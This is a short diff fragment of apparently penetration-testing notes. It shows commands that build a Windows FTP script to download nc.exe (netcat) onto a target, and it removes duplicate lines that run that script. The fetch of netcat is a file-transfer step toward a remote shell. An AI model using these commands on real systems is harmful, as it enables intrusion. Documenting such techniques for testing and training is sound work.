@@ -23,9 +23,7 @@ echo toor>> ftp.txt
 echo bin >> ftp.txt
 echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
-ftp -v -n -s:ftp.txt
 
-ftp -v -n -s:ftp.txt
 ```
 
 Then run this command to connect to the ftp
